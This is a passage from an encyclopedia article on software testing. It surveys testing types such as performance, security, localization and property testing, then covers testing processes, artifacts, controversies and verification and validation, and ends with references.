Functional testing refers to activities that verify a specific action or function of the code. These are usually found in the code requirements documentation, although some development methodologies work from use cases or user stories. Functional tests tend to answer the question of "can the user do this" or "does this particular feature work."
Non-functional testing refers to aspects of the software that may not be related to a specific function or user action, such as scalability or other performance, behavior under certain constraints, or security. Testing will determine the breaking point, the point at which extremes of scalability or performance leads to unstable execution. Non-functional requirements tend to be those that reflect the quality of the product, particularly in the context of the suitability perspective of its users.

Continuous testing[edit]
Main article: Continuous testing
Continuous testing is the process of executing automated tests as part of the software delivery pipeline to obtain immediate feedback on the business risks associated with a software release candidate.[53][54] Continuous testing includes the validation of both functional requirements and non-functional requirements; the scope of testing extends from validating bottom-up requirements or user stories to assessing the system requirements associated with overarching business goals.[55][56]

Destructive testing[edit]
Main article: Destructive testing
Destructive testing attempts to cause the software or a sub-system to fail. It verifies that the software functions properly even when it receives invalid or unexpected inputs, thereby establishing the robustness of input validation and error-management routines.[citation needed] Software fault injection, in the form of fuzzing, is an example of failure testing. Various commercial non-functional testing tools are linked from the software fault injection page; there are also numerous open-source and free software tools available that perform destructive testing.

Further information: Exception handling and Recovery testing
Software performance testing[edit]
Main article: Software performance testing
Performance testing is generally executed to determine how a system or sub-system performs in terms of responsiveness and stability under a particular workload. It can also serve to investigate, measure, validate or verify other quality attributes of the system, such as scalability, reliability and resource usage.
Load testing is primarily concerned with testing that the system can continue to operate under a specific load, whether that be large quantities of data or a large number of users. This is generally referred to as software scalability. The related load testing activity of when performed as a non-functional activity is often referred to as endurance testing. Volume testing is a way to test software functions even when certain components (for example a file or database) increase radically in size. Stress testing is a way to test reliability under unexpected or rare workloads. Stability testing (often referred to as load or endurance testing) checks to see if the software can continuously function well in or above an acceptable period.
There is little agreement on what the specific goals of performance testing are. The terms load testing, performance testing, scalability testing, and volume testing, are often used interchangeably.
Real-time software systems have strict timing constraints. To test if timing constraints are met, real-time testing is used.

Usability testing[edit]
Usability testing is to check if the user interface is easy to use and understand. It is concerned mainly with the use of the application.  This is not a kind of testing that can be automated; actual human users are needed, being monitored by skilled UI designers.

Accessibility testing[edit]
Accessibility testing is done to ensure that the software is accessible to persons with disabilities. Some of the common web accessibility tests are 

Ensuring that the color contrast between the font and the background color is appropriate
Font Size
Alternate Texts for multimedia content
Ability to use the system using the computer keyboard in addition to the mouse.
Common Standards for compliance

Americans with Disabilities Act of 1990
Section 508 Amendment to the Rehabilitation Act of 1973
Web Accessibility Initiative (WAI) of the World Wide Web Consortium (W3C)
Security testing[edit]
Security testing is essential for software that processes confidential data to prevent system intrusion by hackers.
The International Organization for Standardization (ISO) defines this as a "type of testing conducted to evaluate the degree to which a test item, and associated data and information, are protected so that unauthorised persons or systems cannot use, read or modify them, and authorized persons or systems are not denied access to them."[57]

Internationalization and localization[edit]
Testing for internationalization and localization validates that the software can be used with different languages and geographic regions. The process of pseudolocalization is used to test the ability of an application to be translated to another language, and make it easier to identify when the localization process may introduce new bugs into the product.
Globalization testing verifies that the software is adapted for a new culture (such as different currencies or time zones).[58]
Actual translation to human languages must be tested, too. Possible localization and globalization failures include:

Software is often localized by translating a list of strings out of context, and the translator may choose the wrong translation for an ambiguous source string.
Technical terminology may become inconsistent, if the project is translated by several people without proper coordination or if the translator is imprudent.
Literal word-for-word translations may sound inappropriate, artificial or too technical in the target language.
Untranslated messages in the original language may be left hard coded in the source code.
Some messages may be created automatically at run time and the resulting string may be ungrammatical, functionally incorrect, misleading or confusing.
Software may use a keyboard shortcut that has no function on the source language's keyboard layout, but is used for typing characters in the layout of the target language.
Software may lack support for the character encoding of the target language.
Fonts and font sizes that are appropriate in the source language may be inappropriate in the target language; for example, CJK characters may become unreadable, if the font is too small.
A string in the target language may be longer than the software can handle. This may make the string partly invisible to the user or cause the software to crash or malfunction.
Software may lack proper support for reading or writing bi-directional text.
Software may display images with text that was not localized.
Localized operating systems may have differently named system configuration files and environment variables and different formats for date and currency.
Development testing[edit]
Main article: Development testing
Development Testing is a software development process that involves the synchronized application of a broad spectrum of defect prevention and detection strategies in order to reduce software development risks, time, and costs. It is performed by the software developer or engineer during the construction phase of the software development lifecycle. Development Testing aims to eliminate construction errors before code is promoted to other testing; this strategy is intended to increase the quality of the resulting software as well as the efficiency of the overall development process.
Depending on the organization's expectations for software development, Development Testing might include static code analysis, data flow analysis, metrics analysis, peer code reviews, unit testing, code coverage analysis, traceability, and other software testing practices.

A/B testing[edit]
Main article: A/B testing
A/B testing is a method of running a controlled experiment to determine if a proposed change is more effective than the current approach. Customers are routed to either a current version (control) of a feature, or to a modified version (treatment) and data is collected to determine which version is better at achieving the desired outcome.

Concurrent testing[edit]
Main article: Concurrent testing
Concurrent or concurrency testing assesses the behaviour and performance of software and systems that use concurrent computing, generally under normal usage conditions. Typical problems this type of testing will expose are deadlocks, race conditions and problems with shared memory/resource handling.

Conformance testing or type testing[edit]
Main article: Conformance testing
In software testing, conformance testing verifies that a product performs according to its specified standards. Compilers, for instance, are extensively tested to determine whether they meet the recognized standard for that language.

Output comparison testing[edit]
Creating a display expected output, whether as data comparison of text or screenshots of the UI,[4]: 195  is sometimes called snapshot testing or Golden Master Testing unlike many other forms of testing, this cannot detect failures automatically and instead requires that a human evaluate the output for inconsistencies.

Property testing[edit]
Not to be confused with property testing algorithms.
Property testing is a testing technique where, instead of asserting that specific inputs produce specific expected outputs, the practitioner randomly generates many inputs, runs the program on all of them, and asserts the truth of some "property" that should be true for every pair of input and output. For example, every input to a sort function should have the same length as its output. Every output from a sort function should be a monotonically increasing list.
Property testing libraries allow the user to control the strategy by which random inputs are constructed, to ensure coverage of degenerate cases, or inputs featuring specific patterns that are needed to fully exercise aspects of the implementation under test.
Property testing is also sometimes known as "generative testing" or "QuickCheck testing" since it was introduced and popularized by the Haskell library QuickCheck.[59]

Metamorphic testing[edit]
Main article: Metamorphic testing
Metamorphic testing (MT) is a property-based software testing technique, which can be an effective approach for addressing the test oracle problem and test case generation problem. The test oracle problem is the difficulty of determining the expected outcomes of selected test cases or to determine whether the actual outputs agree with the expected outcomes.

VCR testing[edit]
VCR testing, also known as "playback testing" or "record/replay" testing, is a testing technique for increasing the reliability and speed of regression tests that involve a component that is slow or unreliable to communicate with, often a third-party API outside of the tester's control. It involves making a recording ("cassette") of the system's interactions with the external component, and then replaying the recorded interactions as a substitute for communicating with the external system on subsequent runs of the test.
The technique was popularized in web development by the Ruby library vcr.

Testing process[edit]
Traditional waterfall development model[edit]
A common practice in waterfall development is that testing is performed by an independent group of testers. This can happen:

after the functionality is developed, but before it is shipped to the customer.[60] This practice often results in the testing phase being used as a project buffer to compensate for project delays, thereby compromising the time devoted to testing.[14]: 145–146 
at the same moment the development project starts, as a continuous process until the project finishes.[61]
However, even in the waterfall development model, unit testing is often done by the software development team even when further testing is done by a separate team.[62]

Further information: Capability Maturity Model Integration and Waterfall model
Agile or XP development model[edit]
In contrast, some emerging software disciplines such as extreme programming and the agile software development movement, adhere to a "test-driven software development" model. In this process, unit tests are written first, by the software engineers (often with pair programming in the extreme programming methodology). The tests are expected to fail initially. Each failing test is followed by writing just enough code to make it pass.[63] This means the test suites are continuously updated as new failure conditions and corner cases are discovered, and they are integrated with any regression tests that are developed. Unit tests are maintained along with the rest of the software source code and generally integrated into the build process (with inherently interactive tests being relegated to a partially manual build acceptance process).
The ultimate goals of this test process are to support continuous integration and to reduce defect rates.[64][63]
This methodology increases the testing effort done by development, before reaching any formal testing team. In some other development models, most of the test execution occurs after the requirements have been defined and the coding process has been completed.

A sample testing cycle[edit]
Although variations exist between organizations, there is a typical cycle for testing.[2] The sample below is common among organizations employing the Waterfall development model. The same practices are commonly found in other development models, but might not be as clear or explicit.

Requirements analysis: Testing should begin in the requirements phase of the software development life cycle. During the design phase, testers work to determine what aspects of a design are testable and with what parameters those tests work.
Test planning: Test strategy, test plan, testbed creation. Since many activities will be carried out during testing, a plan is needed.
Test development: Test procedures, test scenarios, test cases, test datasets, test scripts to use in testing software.
Test execution: Testers execute the software based on the plans and test documents then report any errors found to the development team. This part could be complex when running tests with a lack of programming knowledge.
Test reporting: Once testing is completed, testers generate metrics and make final reports on their test effort and whether or not the software tested is ready for release.
Test result analysis: Or Defect Analysis, is done by the development team usually along with the client, in order to decide what defects should be assigned, fixed, rejected (i.e. found software working properly) or deferred to be dealt with later.
Defect Retesting: Once a defect has been dealt with by the development team, it is retested by the testing team.
Regression testing: It is common to have a small test program built of a subset of tests, for each integration of new, modified, or fixed software, in order to ensure that the latest delivery has not ruined anything and that the software product as a whole is still working correctly.
Test Closure: Once the test meets the exit criteria, the activities such as capturing the key outputs, lessons learned, results, logs, documents related to the project are archived and used as a reference for future projects.
Automated testing[edit]
Main article: Test automation
Many programming groups[like whom?] are relying more and more[vague] on automated testing, especially groups that use test-driven development. There are many frameworks[specify] to write tests in, and continuous integration software will run tests automatically every time code is checked into a version control system.
While automation cannot reproduce everything that a human can do (and all the ways they think of doing it), it can be very useful for regression testing. However, it does require a well-developed test suite of testing scripts in order to be truly useful.

Testing tools[edit]
Program testing and fault detection can be aided significantly by testing tools and debuggers.
Testing/debug tools include features such as:

Program monitors, permitting full or partial monitoring of program code, including:
Instruction set simulator, permitting complete instruction level monitoring and trace facilities
Hypervisor, permitting complete control of the execution of program code including:-
Program animation, permitting step-by-step execution and conditional breakpoint at source level or in machine code
Code coverage reports
Formatted dump or symbolic debugging, tools allowing inspection of program variables on error or at chosen points
Automated functional Graphical User Interface (GUI) testing tools are used to repeat system-level tests through the GUI
Benchmarks, allowing run-time performance comparisons to be made
Performance analysis (or profiling tools) that can help to highlight hot spots and resource usage
Some of these features may be incorporated into a single composite tool or an Integrated Development Environment (IDE).

Capture and replay[edit]
Capture and replay testing consists in collecting end-to-end usage scenario while interacting with an application and in turning these scenarios into test cases. Possible applications of capture and replay include the generation of regression tests. The SCARPE tool [65] selectively captures a subset of the application under study as it executes. JRapture  captures the sequence of interactions between an executing Java program and components on the host system such as files, or events on graphical user interfaces. These sequences can then be replayed for observation-based testing.[66]
Saieva et al. propose to generate ad-hoc tests that replay recorded user execution traces in order to test candidate patches for critical security bugs.[67]

Measurement in software testing[edit]
Main article: Software quality
Quality measures include such topics as correctness, completeness, security and ISO/IEC 9126 requirements such as capability, reliability, efficiency, portability, maintainability, compatibility, and usability.
There are a number of frequently used software metrics, or measures, which are used to assist in determining the state of the software or the adequacy of the testing.

Hierarchy of testing difficulty[edit]
Based on the number of test cases required to construct a complete test suite in each context (i.e. a test suite such that, if it is applied to the implementation under test, then we collect enough information to precisely determine whether the system is correct or incorrect according to some specification), a hierarchy of testing difficulty has been proposed.[68]
[69] It includes the following testability classes:

Class I: there exists a finite complete test suite.
Class II: any partial distinguishing rate (i.e., any incomplete capability to distinguish correct systems from incorrect systems) can be reached with a finite test suite.
Class III: there exists a countable complete test suite.
Class IV: there exists a complete test suite.
Class V: all cases.
It has been proved that each class is strictly included in the next. For instance, testing when we assume that the behavior of the implementation under test can be denoted by a deterministic finite-state machine for some known finite sets of inputs and outputs and with some known number of states belongs to Class I (and all subsequent classes). However, if the number of states is not known, then it only belongs to all classes from Class II on. If the implementation under test must be a deterministic finite-state machine failing the specification for a single trace (and its continuations), and its number of states is unknown, then it only belongs to classes from Class III on. Testing temporal machines where transitions are triggered if inputs are produced within some real-bounded interval only belongs to classes from Class IV on, whereas testing many non-deterministic systems only belongs to Class V (but not all, and some even belong to Class I). The inclusion into Class I does not require the simplicity of the assumed computation model, as some testing cases involving implementations written in any programming language, and testing implementations defined as machines depending on continuous magnitudes, have been proved to be in Class I. Other elaborated cases, such as the testing framework by Matthew Hennessy under must semantics, and temporal machines with rational timeouts, belong to Class II.

Testing artifacts[edit]
A software testing process can produce several artifacts. The actual artifacts produced are a factor of the software development model used, stakeholder and organisational needs.

Test plan
A test plan is a document detailing the approach that will be taken for intended test activities. The plan may include aspects such as objectives, scope, processes and procedures, personnel requirements, and contingency plans.[42] The test plan could come in the form of a single plan that includes all test types (like an acceptance or system test plan) and planning considerations, or it may be issued as a master test plan that provides an overview of more than one detailed test plan (a plan of a plan).[42] A test plan can be, in some cases, part of a wide "test strategy" which documents overall testing approaches, which may itself be a master test plan or even a separate artifact.
Traceability matrix
A traceability matrix is a table that correlates requirements or design documents to test documents. It is used to change tests when related source documents are changed, to select test cases for execution when planning for regression tests by considering requirement coverage.
Test case
A test case normally consists of a unique identifier, requirement references from a design specification, preconditions, events, a series of steps (also known as actions) to follow, input, output, expected result, and the actual result. Clinically defined, a test case is an input and an expected result.[70] This can be as terse as 'for condition x your derived result is y', although normally test cases describe in more detail the input scenario and what results might be expected. It can occasionally be a series of steps (but often steps are contained in a separate test procedure that can be exercised against multiple test cases, as a matter of economy) but with one expected result or expected outcome. The optional fields are a test case ID, test step, or order of execution number, related requirement(s), depth, test category, author, and check boxes for whether the test is automatable and has been automated. Larger test cases may also contain prerequisite states or steps, and descriptions. A test case should also contain a place for the actual result. These steps can be stored in a word processor document, spreadsheet, database, or other common repositories. In a database system, you may also be able to see past test results, who generated the results, and what system configuration was used to generate those results. These past results would usually be stored in a separate table.
Test script
A test script is a procedure or programming code that replicates user actions. Initially, the term was derived from the product of work created by automated regression test tools. A test case will be a baseline to create test scripts using a tool or a program.
Test suite
The most common term for a collection of test cases is a test suite. The test suite often also contains more detailed instructions or goals for each collection of test cases. It definitely contains a section where the tester identifies the system configuration used during testing. A group of test cases may also contain prerequisite states or steps, and descriptions of the following tests.
Test fixture or test data
In most cases, multiple sets of values or data are used to test the same functionality of a particular feature. All the test values and changeable environmental components are collected in separate files and stored as test data. It is also useful to provide this data to the client and with the product or a project. There are techniques to generate test data.
Test harness
The software, tools, samples of data input and output, and configurations are all referred to collectively as a test harness.
Test run
A report of the results from running a test case or a test suite
Certifications[edit]
Further information: Certification § In software testing
Several certification programs exist to support the professional aspirations of software testers and quality assurance specialists. Note that a few practitioners argue that the testing field is not ready for certification, as mentioned in the controversy section.

Controversy[edit]
Some of the major software testing controversies include:

Agile vs. traditional
Should testers learn to work under conditions of uncertainty and constant change or should they aim at process "maturity"? The agile testing movement has received growing popularity since 2006 mainly in commercial circles,[71][72] whereas government and military[73] software providers use this methodology but also the traditional test-last models (e.g., in the Waterfall model).[citation needed]
Manual vs. automated testing
Some writers believe that test automation is so expensive relative to its value that it should be used sparingly.[74] The test automation then can be considered as a way to capture and implement the requirements. As a general rule, the larger the system and the greater the complexity, the greater the ROI in test automation. Also, the investment in tools and expertise can be amortized over multiple projects with the right level of knowledge sharing within an organization.
Is the existence of the ISO 29119 software testing standard justified?
Significant opposition has formed out of the ranks of the context-driven school of software testing about the ISO 29119 standard. Professional testing associations, such as the International Society for Software Testing, have attempted to have the standard withdrawn.[75][76]
Some practitioners declare that the testing field is not ready for certification
[77] No certification now offered actually requires the applicant to show their ability to test software. No certification is based on a widely accepted body of knowledge. Certification itself cannot measure an individual's productivity, their skill, or practical knowledge, and cannot guarantee their competence, or professionalism as a tester.[78]
Studies used to show the relative expense of fixing defects
There are opposing views on the applicability of studies used to show the relative expense of fixing defects depending on their introduction and detection. For example:

It is commonly believed that the earlier a defect is found, the cheaper it is to fix it. The following table shows the cost of fixing the defect depending on the stage it was found.[79] For example, if a problem in the requirements is found only post-release, then it would cost 10–100 times more to fix than if it had already been found by the requirements review. With the advent of modern continuous deployment practices and cloud-based services, the cost of re-deployment and maintenance may lessen over time.



Cost to fix a defect

Time detected


Requirements

Architecture

Construction

System test

Post-release


Time introduced

Requirements

1×

3×

5–10×

10×

10–100×


Architecture

–

1×

10×

15×

25–100×


Construction

–

–

1×

10×

10–25×



The data from which this table is extrapolated is scant. Laurent Bossavit says in his analysis:


The "smaller projects" curve turns out to be from only two teams of first-year students, a sample size so small that extrapolating to "smaller projects in general" is totally indefensible. The GTE study does not explain its data, other than to say it came from two projects, one large and one small. The paper cited for the Bell Labs "Safeguard" project specifically disclaims having collected the fine-grained data that Boehm's data points suggest. The IBM study (Fagan's paper) contains claims that seem to contradict Boehm's graph and no numerical results that clearly correspond to his data points.

Boehm doesn't even cite a paper for the TRW data, except when writing for "Making Software" in 2010, and there he cited the original 1976 article. There exists a large study conducted at TRW at the right time for Boehm to cite it, but that paper doesn't contain the sort of data that would support Boehm's claims.[80]

Related processes[edit]
Software verification and validation[edit]
Main articles: Verification and validation (software) and Software quality control
Software testing is used in association with verification and validation:[81]

Verification: Have we built the software right? (i.e., does it implement the requirements).
Validation: Have we built the right software? (i.e., do the deliverables satisfy the customer).
The terms verification and validation are commonly used interchangeably in the industry; it is also common to see these two terms defined with contradictory definitions. According to the IEEE Standard Glossary of Software Engineering Terminology:[6]: 80–81 

Verification is the process of evaluating a system or component to determine whether the products of a given development phase satisfy the conditions imposed at the start of that phase.
Validation is the process of evaluating a system or component during or at the end of the development process to determine whether it satisfies specified requirements.
And, according to the ISO 9000 standard:

Verification is confirmation by examination and through provision of objective evidence that specified requirements have been fulfilled.
Validation is confirmation by examination and through provision of objective evidence that the requirements for a specific intended use or application have been fulfilled.
The contradiction is caused by the use of the concepts of requirements and specified requirements but with different meanings.
In the case of IEEE standards, the specified requirements, mentioned in the definition of validation, are the set of problems, needs and wants of the stakeholders that the software must solve and satisfy. Such requirements are documented in a Software Requirements Specification (SRS). And, the products mentioned in the definition of verification, are the output artifacts of every phase of the software development process. These products are, in fact, specifications such as Architectural Design Specification, Detailed Design Specification, etc. The SRS is also a specification, but it cannot be verified (at least not in the sense used here, more on this subject below).
But, for the ISO 9000, the specified requirements are the set of specifications, as just mentioned above, that must be verified. A specification, as previously explained, is the product of a software development process phase that receives another specification as input. A specification is verified successfully when it correctly implements its input specification. All the specifications can be verified except the SRS because it is the first one (it can be validated, though). Examples: The Design Specification must implement the SRS; and, the Construction phase artifacts must implement the Design Specification.
So, when these words are defined in common terms, the apparent contradiction disappears.
Both the SRS and the software must be validated. The SRS can be validated statically by consulting with the stakeholders. Nevertheless, running some partial implementation of the software or a prototype of any kind (dynamic testing) and obtaining positive feedback from them, can further increase the certainty that the SRS is correctly formulated. On the other hand, the software, as a final and running product (not its artifacts and documents, including the source code) must be validated dynamically with the stakeholders by executing the software and having them to try it.
Some might argue that, for SRS, the input is the words of stakeholders and, therefore, SRS validation is the same as SRS verification. Thinking this way is not advisable as it only causes more confusion. It is better to think of verification as a process involving a formal and technical input document.

Software quality assurance[edit]
Software testing may be considered a part of a software quality assurance (SQA) process.[4]: 347  In SQA, software process specialists and auditors are concerned with the software development process rather than just the artifacts such as documentation, code and systems. They examine and change the software engineering process itself to reduce the number of faults that end up in the delivered software: the so-called defect rate. What constitutes an acceptable defect rate depends on the nature of the software; a flight simulator video game would have much higher defect tolerance than software for an actual airplane. Although there are close links with SQA, testing departments often exist independently, and there may be no SQA function in some companies.[citation needed]
Software testing is an activity to investigate software under test in order to provide quality-related information to stakeholders. By contrast, QA (quality assurance) is the implementation of policies and procedures intended to prevent defects from reaching customers.

See also[edit]

Data validation – The process of ensuring computer data is both correct and useful
Dynamic program analysis – Analysis of computer software that is performed by executing the program
Formal verification – Proving or disproving the correctness of certain intended algorithms
Graphical user interface testing – Term in software engineering
Independent test organization – Organization that tests according to agreed requirements
Manual testing – Testing software without the use of special tools to automate the process
Orthogonal array testing – Software testing technique
Pair testing – Software testing technique
Reverse semantic traceability – Quality control technique
Software testing tactics – Overview of several notable tactics useful in software testing
Test management tool – Stores test steps, test planing and reporting
Trace table – Software testing technique
Web testing – Software testing that focuses on web applications

References[edit]


^ Kaner, Cem (November 17, 2006). Exploratory Testing (PDF). Quality Assurance Institute Worldwide Annual Software Testing Conference. Orlando, FL. Retrieved November 22, 2014.

^ a b Pan, Jiantao (Spring 1999). "Software Testing" (coursework). Carnegie Mellon University. Retrieved November 21, 2017.

^ Leitner, Andreas; Ciupa, Ilinca; Oriol, Manuel; Meyer, Bertrand; Fiva, Arno (September 2007). Contract Driven Development = Test Driven Development – Writing Test Cases (PDF). ESEC/FSE'07: European Software Engineering Conference and the ACM SIGSOFT Symposium on the Foundations of Software Engineering 2007. Dubrovnik, Croatia. Retrieved December 8, 2017.

^ a b c d Kaner, Cem; Falk, Jack; Nguyen, Hung Quoc (1999). Testing Computer Software (2nd ed.). New York: John Wiley and Sons. ISBN 978-0-471-35846-6.

^ a b Kolawa, Adam; Huizinga, Dorota (2007). Automated Defect Prevention: Best Practices in Software Management. Wiley-IEEE Computer Society Press. ISBN 978-0-470-04212-0.

^ a b c 610.12-1990 - IEEE Standard Glossary of Software Engineering Terminology, IEEE, 1990, doi:10.1109/IEEESTD.1990.101064, ISBN 978-1-55937-067-7

^ "Certified Tester Foundation Level Syllabus" (pdf). International Software Testing Qualifications Board. March 31, 2011. Section 1.1.2. Retrieved December 15, 2017.

^ "Certified Tester Foundation Level Syllabus" (PDF). International Software Testing Qualifications Board. July 1, 2005. Principle 2, Section 1.3. Archived from the original (PDF) on December 17, 2008. Retrieved December 15, 2017.

^ Ramler, Rudolf; Kopetzky, Theodorich; Platz, Wolfgang (April 17, 2012). Combinatorial Test Design in the TOSCA Testsuite: Lessons Learned and Practical Implications. IEEE Fifth International Conference on Software Testing and Validation (ICST). Montreal, QC, Canada. doi:10.1109/ICST.2012.142.

^ "The Economic Impacts of Inadequate Infrastructure for Software Testing" (PDF). National Institute of Standards and Technology. May 2002. Retrieved December 19, 2017.

^ Sharma, Bharadwaj (April 2016). "Ardentia Technologies: Providing Cutting Edge Software Solutions and Comprehensive Testing Services". CIO Review (India ed.). Retrieved December 20, 2017.

^ Gelperin, David; Hetzel, Bill (June 1, 1988). "The growth of software testing". Communications of the ACM. 31 (6): 687–695. doi:10.1145/62959.62965. S2CID 14731341.

^ Gregory, Janet; Crispin, Lisa (2014). More Agile Testing. Addison-Wesley Professional. pp. 23–39. ISBN 978-0-13-374956-4.

^ a b c Myers, Glenford J. (1979). The Art of Software Testing. John Wiley and Sons. ISBN 978-0-471-04328-7.

^ a b Graham, D.; Van Veenendaal, E.; Evans, I. (2008). Foundations of Software Testing. Cengage Learning. pp. 57–58. ISBN 978-1-84480-989-9.

^ a b c d Oberkampf, W.L.; Roy, C.J. (2010). Verification and Validation in Scientific Computing. Cambridge University Press. pp. 154–5. ISBN 978-1-139-49176-1.

^ Lee, D.; Netravali, A.N.; Sabnani, K.K.; Sugla, B.; John, A. (1997). "Passive testing and applications to network management". Proceedings 1997 International Conference on Network Protocols. IEEE Comput. Soc: 113–122. doi:10.1109/icnp.1997.643699. ISBN 978-0-8186-8061-8. S2CID 42596126.

^ a b Cem Kaner (2008), A Tutorial in Exploratory Testing (PDF)

^ a b c d Limaye, M.G. (2009). Software Testing. Tata McGraw-Hill Education. pp. 108–11. ISBN 978-0-07-013990-9.

^ a b c d Saleh, K.A. (2009). Software Engineering. J. Ross Publishing. pp. 224–41. ISBN 978-1-932159-94-3.

^ a b c Ammann, P.; Offutt, J. (2016). Introduction to Software Testing. Cambridge University Press. p. 26. ISBN 978-1-316-77312-3.

^ Everatt, G.D.; McLeod Jr., R. (2007). "Chapter 7: Functional Testing". Software Testing: Testing Across the Entire Software Development Life Cycle. John Wiley & Sons. pp. 99–121. ISBN 978-0-470-14634-7.

^ a b Cornett, Steve (c. 1996). "Code Coverage Analysis". Bullseye Testing Technology. Introduction. Retrieved November 21, 2017.

^ a b Black, R. (2011). Pragmatic Software Testing: Becoming an Effective and Efficient Test Professional. John Wiley & Sons. pp. 44–6. ISBN 978-1-118-07938-6.

^ As a simple example, the C function int f(int x){return x*x-6*x+8;} consists of only one statement. All tests against a specification f(x)>=0 will succeed, except if x=3 happens to be chosen.

^ Patton, Ron (2005). Software Testing (2nd ed.). Indianapolis: Sams Publishing. ISBN 978-0-672-32798-8.

^ Laycock, Gilbert T. (1993). The Theory and Practice of Specification Based Software Testing (PDF) (dissertation thesis). Department of Computer Science, University of Sheffield. Retrieved January 2, 2018.

^ Bach, James (June 1999). "Risk and Requirements-Based Testing" (PDF). Computer. 32 (6): 113–114. Retrieved August 19, 2008.

^ Savenkov, Roman (2008). How to Become a Software Tester. Roman Savenkov Consulting. p. 159. ISBN 978-0-615-23372-7.

^ Mathur, A.P. (2011). Foundations of Software Testing. Pearson Education India. p. 63. ISBN 978-81-317-5908-0.

^ a b Clapp, Judith A. (1995). Software Quality Control, Error Analysis, and Testing. p. 313. ISBN 978-0-8155-1363-6. Retrieved January 5, 2018.

^ Mathur, Aditya P. (2007). Foundations of Software Testing. Pearson Education India. p. 18. ISBN 978-81-317-1660-1.

^ Lönnberg, Jan (October 7, 2003). Visual testing of software (PDF) (MSc thesis). Helsinki University of Technology. Retrieved January 13, 2012.

^ Chima, Raspal. "Visual testing". TEST Magazine. Archived from the original on July 24, 2012. Retrieved January 13, 2012.

^ a b c Lewis, W.E. (2016). Software Testing and Continuous Quality Improvement (3rd ed.). CRC Press. pp. 68–73. ISBN 978-1-4398-3436-7.

^ a b Ransome, J.; Misra, A. (2013). Core Software Security: Security at the Source. CRC Press. pp. 140–3. ISBN 978-1-4665-6095-6.

^ "SOA Testing Tools for Black, White and Gray Box" (white paper). Crosscheck Networks. Archived from the original on October 1, 2018. Retrieved December 10, 2012.

^ Bourque, Pierre; Fairley, Richard E., eds. (2014). "Chapter 5". Guide to the Software Engineering Body of Knowledge. 3.0. IEEE Computer Society. ISBN 978-0-7695-5166-1. Retrieved January 2, 2018.

^ Bourque, P.; Fairley, R.D., eds. (2014). "Chapter 4: Software Testing" (PDF). SWEBOK v3.0: Guide to the Software Engineering Body of Knowledge. IEEE. pp. 4–1–4–17. ISBN 978-0-7695-5166-1. Archived from the original (PDF) on June 19, 2018. Retrieved July 13, 2018.

^ Dooley, J. (2011). Software Development and Professional Practice. APress. pp. 193–4. ISBN 978-1-4302-3801-0.

^ Wiegers, K. (2013). Creating a Software Engineering Culture. Addison-Wesley. pp. 211–2. ISBN 978-0-13-348929-3.

^ a b c Lewis, W.E. (2016). Software Testing and Continuous Quality Improvement (3rd ed.). CRC Press. pp. 92–6. ISBN 978-1-4398-3436-7.

^ Machado, P.; Vincenzi, A.; Maldonado, J.C. (2010). "Chapter 1: Software Testing: An Overview".  In Borba, P.; Cavalcanti, A.; Sampaio, A.; Woodcook, J. (eds.). Testing Techniques in Software Engineering. Springer Science & Business Media. pp. 13–14. ISBN 978-3-642-14334-2.

^ Clapp, J.A.; Stanten, S.F.; Peng, W.W.;  et al. (1995). Software Quality Control, Error Analysis, and Testing. Nova Data Corporation. p. 254. ISBN 978-0-8155-1363-6.

^ a b c "ISTQB CTFL Syllabus 2018" (PDF). ISTQB - International Software Testing Qualifications Board. Archived (PDF) from the original on March 24, 2022. Retrieved April 11, 2022.

^ Binder, Robert V. (1999). Testing Object-Oriented Systems: Objects, Patterns, and Tools. Addison-Wesley Professional. p. 45. ISBN 978-0-201-80938-1.

^ Beizer, Boris (1990). Software Testing Techniques (Second ed.). New York: Van Nostrand Reinhold. pp. 21, 430. ISBN 978-0-442-20672-7.

^ Woods, Anthony J. (June 5, 2015). "Operational Acceptance – an application of the ISO 29119 Software Testing standard" (Whitepaper). Capgemini Australia. Retrieved January 9, 2018.

^ Kaner, Cem; Bach, James; Pettichord, Bret (2001). Lessons Learned in Software Testing: A Context-Driven Approach. Wiley. pp. 31–43. ISBN 978-0-471-08112-8.

^ Ammann, Paul; Offutt, Jeff (January 28, 2008). Introduction to Software Testing. Cambridge University Press. p. 215. ISBN 978-0-521-88038-1. Retrieved November 29, 2017.

^ "Standard Glossary of Terms used in Software Testing" (PDF). Version 3.1. International Software Testing Qualifications Board. Retrieved January 9, 2018.

^ O'Reilly, Tim (September 30, 2005). "What is Web 2.0". O'Reilly Media. Section 4. End of the Software Release Cycle. Retrieved January 11, 2018.

^ Auerbach, Adam (August 3, 2015). "Part of the Pipeline: Why Continuous Testing Is Essential". TechWell Insights. TechWell Corp. Retrieved January 12, 2018.

^ Philipp-Edmonds, Cameron (December 5, 2014). "The Relationship between Risk and Continuous Testing: An Interview with Wayne Ariola". Stickyminds. Retrieved January 16, 2018.

^ Ariola, Wayne; Dunlop, Cynthia (October 2015). DevOps: Are You Pushing Bugs to Clients Faster? (PDF). Pacific Northwest Software Quality Conference. Retrieved January 16, 2018.

^ Auerbach, Adam (October 2, 2014). "Shift Left and Put Quality First". TechWell Insights. TechWell Corp. Retrieved January 16, 2018.

^ "Section 4.38". ISO/IEC/IEEE 29119-1:2013 – Software and Systems Engineering – Software Testing – Part 1 – Concepts and Definitions. International Organization for Standardization. Retrieved January 17, 2018.

^ "Globalization Step-by-Step: The World-Ready Approach to Testing. Microsoft Developer Network". Msdn.microsoft.com. Archived from the original on June 23, 2012. Retrieved January 13, 2012.

^ ""QuickCheck: a lightweight tool for random testing of Haskell programs"". Proceedings of the Fifth ACM SIGPLAN International Conference on Functional Programming. Icfp '00: 268–279. 2000. doi:10.1145/351240.351266. ISBN 978-1-58113-202-1. S2CID 5668071.

^ "Software Testing Lifecycle". etestinghub. Testing Phase in Software Testing. Retrieved January 13, 2012.

^ Dustin, Elfriede (2002). Effective Software Testing. Addison-Wesley Professional. p. 3. ISBN 978-0-201-79429-8.

^ Brown, Chris; Cobb, Gary; Culbertson, Robert (April 12, 2002). Introduction to Rapid Software Testing.

^ a b "What is Test Driven Development (TDD)?". Agile Alliance. December 5, 2015. Retrieved March 17, 2018.

^ "Test-Driven Development and Continuous Integration for Mobile Applications". msdn.microsoft.com. Retrieved March 17, 2018.

^ Joshi, Shrinivas; Orso, Alessandro (October 2007). "SCARPE: A Technique and Tool for Selective Capture and Replay of Program Executions". 2007 IEEE International Conference on Software Maintenance: 234–243. doi:10.1109/ICSM.2007.4362636. ISBN 978-1-4244-1255-6. S2CID 17718313.

